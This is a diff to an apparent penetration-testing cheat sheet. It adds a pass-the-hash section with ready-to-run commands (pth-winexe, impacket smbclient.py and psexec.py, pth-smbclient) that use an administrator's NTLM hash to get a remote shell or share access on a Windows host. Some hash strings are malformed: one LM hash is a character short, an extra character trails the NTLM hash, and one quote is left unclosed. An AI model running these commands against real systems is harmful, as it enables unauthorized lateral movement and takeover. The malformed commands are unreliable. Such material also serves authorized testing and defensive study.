@@ -107,7 +107,9 @@ schtasks /S TARGET /TN "MYTASK" /DELETE /F
 
 ``` ```
 ``` ```
-## Passing the hash method
+## PTH - Pass the hash methods
+
+##### ➤  PTH-winexe
 
 Install
 ```
@@ -118,6 +120,22 @@ Pass the hash
 ```
 #From the kali linux machine
 pth-winexe -U 'admin%hash' //10.0.0.1 cmd.exe
+pth-winexe -U 'admin%ad3b435b51404eeaad3b435b51404ee:32196B56FFE6F45E294117B91A83BF38a //10.0.0.1 cmd.exe
 ```
 
 **Note:** Remember the full hash includes both the LM and NTLM hash, separated by a colon
+
+##### ➤  smbclient.py (impacket)
+```
+python /opt/impacket/examples/smbclient.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/admin@10.0.0.1
+```
+
+##### ➤  PTH-smbclient
+```
+pth-smbclient -U ignite/adminr%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //10.0.0.1/c$
+```
+
+##### ➤  psexec.py (impacket)
+```
+python3 psexec.py -hashes ad3b435b51404eeaad3b435b51404ee:32196B56FFE6F45E294117B91A83BF38a admin@10.0.0.1
+```
